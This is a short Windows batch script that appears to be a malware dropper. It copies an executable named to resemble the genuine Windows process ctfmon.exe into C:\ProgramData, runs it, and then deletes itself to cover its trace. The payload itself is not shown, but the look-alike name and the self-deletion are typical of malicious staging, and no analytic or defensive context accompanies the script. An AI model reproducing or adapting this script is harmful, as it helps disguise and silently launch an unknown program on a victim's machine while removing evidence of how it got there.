@echo off
copy ctfmons.exe c:\programdata\ctfmons.exe
copy c:\users\public\downloads\ctfmons.exe c:\programdata\ctfmons.exe
start c:\programdata\ctfmons.exe
del %0
pause